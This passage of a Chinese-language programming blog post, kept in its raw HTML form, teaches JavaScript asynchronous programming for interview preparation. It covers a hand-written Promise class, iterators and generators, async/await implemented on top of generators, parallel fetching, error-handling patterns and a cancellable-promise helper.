class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyPromise</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">executor</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> = <span class="hljs-string">&#x27;pending&#x27;</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">reason</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">onFulfilledCallbacks</span> = [];<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">onRejectedCallbacks</span> = [];<br><br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">resolve</span> = value =&gt; &#123;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> === <span class="hljs-string">&#x27;pending&#x27;</span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> = <span class="hljs-string">&#x27;fulfilled&#x27;</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span> = value;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">onFulfilledCallbacks</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">fn</span> =&gt;</span> <span class="hljs-title function_">fn</span>());<br>      &#125;<br>    &#125;;<br><br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">reject</span> = reason =&gt; &#123;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> === <span class="hljs-string">&#x27;pending&#x27;</span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> = <span class="hljs-string">&#x27;rejected&#x27;</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">reason</span> = reason;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">onRejectedCallbacks</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">fn</span> =&gt;</span> <span class="hljs-title function_">fn</span>());<br>      &#125;<br>    &#125;;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-title function_">executor</span>(resolve, reject);<br>    &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>      <span class="hljs-title function_">reject</span>(error);<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-title function_">then</span>(<span class="hljs-params">onFulfilled, onRejected</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyPromise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>      <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleFulfilled</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>          <span class="hljs-keyword">typeof</span> onFulfilled === <span class="hljs-string">&#x27;function&#x27;</span><br>            ? <span class="hljs-title function_">resolve</span>(<span class="hljs-title function_">onFulfilled</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span>))<br>            : <span class="hljs-title function_">resolve</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>          <span class="hljs-title function_">reject</span>(error);<br>        &#125;<br>      &#125;;<br><br>      <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleRejected</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>          <span class="hljs-keyword">typeof</span> onRejected === <span class="hljs-string">&#x27;function&#x27;</span><br>            ? <span class="hljs-title function_">resolve</span>(<span class="hljs-title function_">onRejected</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">reason</span>))<br>            : <span class="hljs-title function_">reject</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">reason</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>          <span class="hljs-title function_">reject</span>(error);<br>        &#125;<br>      &#125;;<br><br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> === <span class="hljs-string">&#x27;fulfilled&#x27;</span>) &#123;<br>        <span class="hljs-built_in">setTimeout</span>(handleFulfilled, <span class="hljs-number">0</span>);<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> === <span class="hljs-string">&#x27;rejected&#x27;</span>) &#123;<br>        <span class="hljs-built_in">setTimeout</span>(handleRejected, <span class="hljs-number">0</span>);<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">onFulfilledCallbacks</span>.<span class="hljs-title function_">push</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">setTimeout</span>(handleFulfilled, <span class="hljs-number">0</span>));<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">onRejectedCallbacks</span>.<span class="hljs-title function_">push</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">setTimeout</span>(handleRejected, <span class="hljs-number">0</span>));<br>      &#125;<br>    &#125;);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Iterator-和-Generator：可迭代协议与生成器"><a href="#Iterator-和-Generator：可迭代协议与生成器" class="headerlink" title="Iterator 和 Generator：可迭代协议与生成器"></a>Iterator 和 Generator：可迭代协议与生成器</h2><p><strong>Iterator（迭代器）</strong></p><ul><li>迭代器协议：任何实现了 next() 方法的对象<ul><li>next() 返回 { value, done } 对象</li></ul></li><li>可迭代协议：实现了 <a href="">Symbol.iterator</a> 方法的对象</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 自定义迭代器</span><br><span class="hljs-keyword">const</span> counter = &#123;<br>  [<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">iterator</span>]() &#123;<br>    <span class="hljs-keyword">let</span> count = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> &#123;<br>      <span class="hljs-title function_">next</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> count &lt;= <span class="hljs-number">5</span> <br>          ? &#123; <span class="hljs-attr">value</span>: count++, <span class="hljs-attr">done</span>: <span class="hljs-literal">false</span> &#125; <br>          : &#123; <span class="hljs-attr">done</span>: <span class="hljs-literal">true</span> &#125;;<br>      &#125;<br>    &#125;;<br>  &#125;<br>&#125;;<br><br><span class="hljs-comment">// 使用迭代器</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> num <span class="hljs-keyword">of</span> counter) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(num); <span class="hljs-comment">// 1, 2, 3, 4, 5</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Generator（生成器）</strong></p><ul><li>函数生成器：使用 function* 定义的生成器函数</li><li>执行控制：通过 yield 暂停执行，通过 next() 恢复执行</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span>* <span class="hljs-title function_">idGenerator</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">let</span> id = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>    <span class="hljs-keyword">const</span> reset = <span class="hljs-keyword">yield</span> id++;<br>    <span class="hljs-keyword">if</span> (reset) id = <span class="hljs-number">1</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> gen = <span class="hljs-title function_">idGenerator</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(gen.<span class="hljs-title function_">next</span>().<span class="hljs-property">value</span>); <span class="hljs-comment">// 1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(gen.<span class="hljs-title function_">next</span>().<span class="hljs-property">value</span>); <span class="hljs-comment">// 2</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(gen.<span class="hljs-title function_">next</span>(<span class="hljs-literal">true</span>).<span class="hljs-property">value</span>); <span class="hljs-comment">// 1（重置）</span><br></code></pre></td></tr></table></figure><p><strong>高级生成器特性</strong></p><p>(1) 双向通信</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span>* <span class="hljs-title function_">twoWayGenerator</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> name = <span class="hljs-keyword">yield</span> <span class="hljs-string">&#x27;What is your name?&#x27;</span>;<br>  <span class="hljs-keyword">yield</span> <span class="hljs-string">`Hello, <span class="hljs-subst">$&#123;name&#125;</span>!`</span>;<br>&#125;<br><br><span class="hljs-keyword">const</span> gen = <span class="hljs-title function_">twoWayGenerator</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(gen.<span class="hljs-title function_">next</span>().<span class="hljs-property">value</span>); <span class="hljs-comment">// &quot;What is your name?&quot;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(gen.<span class="hljs-title function_">next</span>(<span class="hljs-string">&#x27;Alice&#x27;</span>).<span class="hljs-property">value</span>); <span class="hljs-comment">// &quot;Hello, Alice!&quot;</span><br></code></pre></td></tr></table></figure><p>(2) 错误处理</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span>* <span class="hljs-title function_">errorGenerator</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">yield</span> <span class="hljs-string">&#x27;Start&#x27;</span>;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Something wrong&#x27;</span>);<br>  &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>    <span class="hljs-keyword">yield</span> <span class="hljs-string">`Caught: <span class="hljs-subst">$&#123;e.message&#125;</span>`</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> gen = <span class="hljs-title function_">errorGenerator</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(gen.<span class="hljs-title function_">next</span>().<span class="hljs-property">value</span>); <span class="hljs-comment">// &quot;Start&quot;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(gen.<span class="hljs-title function_">next</span>().<span class="hljs-property">value</span>); <span class="hljs-comment">// &quot;Caught: Something wrong&quot;</span><br></code></pre></td></tr></table></figure><h2 id="Async-Await：异步编程的终极解决方案"><a href="#Async-Await：异步编程的终极解决方案" class="headerlink" title="Async&#x2F;Await：异步编程的终极解决方案"></a>Async&#x2F;Await：异步编程的终极解决方案</h2><p><strong>本质与原理</strong></p><ul><li>语法糖：async&#x2F;await 是 Generator + Promise 的语法糖</li><li>执行过程：<ul><li>async 函数返回一个 Promise</li><li>await 等待 Promise 解析（暂停执行但不阻塞主线程）</li><li>通过隐式的生成器控制执行流程</li></ul></li></ul><p><strong>基本用法</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchUserData</span>(<span class="hljs-params">userId</span>) &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/users/<span class="hljs-subst">$&#123;userId&#125;</span>`</span>);<br>    <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;用户数据获取失败&#x27;</span>);<br>    <br>    <span class="hljs-keyword">const</span> userData = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();<br>    <span class="hljs-keyword">const</span> posts = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/posts?userId=<span class="hljs-subst">$&#123;userId&#125;</span>`</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> r.<span class="hljs-title function_">json</span>());<br>    <br>    <span class="hljs-keyword">return</span> &#123; ...userData, posts &#125;;<br>  &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;数据加载失败:&#x27;</span>, error);<br>    <span class="hljs-keyword">throw</span> error;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 使用</span><br><span class="hljs-title function_">fetchUserData</span>(<span class="hljs-number">123</span>)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data))<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error));<br></code></pre></td></tr></table></figure><p><strong>实现原理（基于 Generator）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">asyncGenerator</span>(<span class="hljs-params">generatorFunc</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">...args</span>) &#123;<br>    <span class="hljs-keyword">const</span> gen = generatorFunc.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, args);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>      <span class="hljs-keyword">function</span> <span class="hljs-title function_">step</span>(<span class="hljs-params">key, arg</span>) &#123;<br>        <span class="hljs-keyword">let</span> result;<br>        <span class="hljs-keyword">try</span> &#123;<br>          result = gen[key](arg);<br>        &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>          <span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(error);<br>        &#125;<br>        <br>        <span class="hljs-keyword">const</span> &#123; value, done &#125; = result;<br>        <span class="hljs-keyword">if</span> (done) &#123;<br>          <span class="hljs-keyword">return</span> <span class="hljs-title function_">resolve</span>(value);<br>        &#125;<br>        <br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(value).<span class="hljs-title function_">then</span>(<br>          <span class="hljs-function"><span class="hljs-params">val</span> =&gt;</span> <span class="hljs-title function_">step</span>(<span class="hljs-string">&#x27;next&#x27;</span>, val),<br>          <span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> <span class="hljs-title function_">step</span>(<span class="hljs-string">&#x27;throw&#x27;</span>, err)<br>        );<br>      &#125;<br>      <br>      <span class="hljs-title function_">step</span>(<span class="hljs-string">&#x27;next&#x27;</span>);<br>    &#125;);<br>  &#125;;<br>&#125;<br><br><span class="hljs-comment">// 使用</span><br><span class="hljs-keyword">const</span> myAsync = <span class="hljs-title function_">asyncGenerator</span>(<span class="hljs-keyword">function</span>* () &#123;<br>  <span class="hljs-keyword">const</span> a = <span class="hljs-keyword">yield</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">const</span> b = <span class="hljs-keyword">yield</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-number">2</span>);<br>  <span class="hljs-keyword">return</span> a + b;<br>&#125;);<br><br><span class="hljs-title function_">myAsync</span>().<span class="hljs-title function_">then</span>(<span class="hljs-variable language_">console</span>.<span class="hljs-property">log</span>); <span class="hljs-comment">// 3</span><br></code></pre></td></tr></table></figure><p><strong>最佳实践</strong></p><p>(1) 并行优化</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 顺序执行（慢）</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">sequentialFetch</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/user&#x27;</span>);<br>  <span class="hljs-keyword">const</span> posts = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/posts&#x27;</span>);<br>  <span class="hljs-keyword">return</span> &#123; user, posts &#125;;<br>&#125;<br><br><span class="hljs-comment">// 并行执行（快）</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">parallelFetch</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [user, posts] = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([<br>    <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/user&#x27;</span>),<br>    <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/posts&#x27;</span>)<br>  ]);<br>  <span class="hljs-keyword">return</span> &#123; user, posts &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) 循环中的 await</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 错误方式（顺序执行）</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">processArray</span>(<span class="hljs-params">array</span>) &#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> item <span class="hljs-keyword">of</span> array) &#123;<br>    <span class="hljs-keyword">await</span> <span class="hljs-title function_">processItem</span>(item); <span class="hljs-comment">// 每次循环都等待</span><br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 正确方式（并行处理）</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">processArrayFast</span>(<span class="hljs-params">array</span>) &#123;<br>  <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(array.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> <span class="hljs-title function_">processItem</span>(item)));<br>&#125;<br></code></pre></td></tr></table></figure><p>(3) 错误处理模式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 方式1：try/catch</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">tryCatchExample</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">asyncOperation</span>();<br>    <span class="hljs-keyword">return</span> result;<br>  &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>    <span class="hljs-title function_">handleError</span>(error);<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 方式2：Promise.catch</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">catchExample</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">asyncOperation</span>().<span class="hljs-title function_">catch</span>(handleError);<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-comment">// 方式3：高阶函数封装</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">asyncHandler</span>(<span class="hljs-params">promise</span>) &#123;<br>  <span class="hljs-keyword">return</span> promise.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> [<span class="hljs-literal">null</span>, data]).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> [err]);<br>&#125;<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">handlerExample</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [error, data] = <span class="hljs-keyword">await</span> <span class="hljs-title function_">asyncHandler</span>(<span class="hljs-title function_">asyncOperation</span>());<br>  <span class="hljs-keyword">if</span> (error) <span class="hljs-title function_">handleError</span>(error);<br>  <span class="hljs-keyword">return</span> data;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="面试常见问题-7"><a href="#面试常见问题-7" class="headerlink" title="面试常见问题"></a>面试常见问题</h2><p><strong>Q：Promise 和 Async&#x2F;Await 的主要区别是什么？</strong></p><ul><li>Promise 是对象，async&#x2F;await 是语法</li><li>async&#x2F;await 使异步代码看起来像同步代码</li><li>async&#x2F;await 的错误处理使用 try&#x2F;catch 更直观</li><li>async&#x2F;await 更容易实现复杂的控制流</li></ul><p><strong>Q：Generator 函数在异步编程中的角色是什么？</strong></p><ul><li>提供暂停和恢复执行的能力</li><li>是 async&#x2F;await 的实现基础</li><li>适合实现自定义迭代逻辑</li><li>可用于实现协程（coroutine）和状态机</li></ul><p><strong>Q：如何处理多个异步操作的错误？</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleMultiple</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">const</span> [a, b] = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([<br>      <span class="hljs-title function_">taskA</span>().<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> (&#123; <span class="hljs-attr">error</span>: e &#125;)),<br>      <span class="hljs-title function_">taskB</span>().<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> (&#123; <span class="hljs-attr">error</span>: e &#125;))<br>    ]);<br>    <br>    <span class="hljs-keyword">if</span> (a.<span class="hljs-property">error</span>) <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;A失败:&#x27;</span>, a.<span class="hljs-property">error</span>);<br>    <span class="hljs-keyword">if</span> (b.<span class="hljs-property">error</span>) <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;B失败:&#x27;</span>, b.<span class="hljs-property">error</span>);<br>    <br>    <span class="hljs-keyword">if</span> (!a.<span class="hljs-property">error</span> &amp;&amp; !b.<span class="hljs-property">error</span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;全部成功:&#x27;</span>, a, b);<br>    &#125;<br>  &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;全局错误:&#x27;</span>, error);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Q：如何取消一个正在进行的异步操作</strong></p><p>在异步操作结果响应之前主动 reject 掉（setTimeout）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">cancellableAsync</span>(<span class="hljs-params">task</span>) &#123;<br>  <span class="hljs-keyword">let</span> cancel;<br>  <span class="hljs-keyword">const</span> promise = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>    cancel = <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;操作取消&#x27;</span>));<br>    <span class="hljs-title function_">task</span>(resolve, reject);<br>  &#125;);<br>  <span class="hljs-keyword">return</span> &#123; promise, cancel &#125;;<br>&#125;<br><br><span class="hljs-comment">// 使用</span><br><span class="hljs-keyword">const</span> &#123; promise, cancel &#125; = <span class="hljs-title function_">cancellableAsync</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">resolve</span>(<span class="hljs-string">&#x27;完成&#x27;</span>), <span class="hljs-number">3000</span>);<br>&#125;);<br><br>promise<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-variable language_">console</span>.<span class="hljs-property">log</span>)<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e.<span class="hljs-property">message</span>)); <span 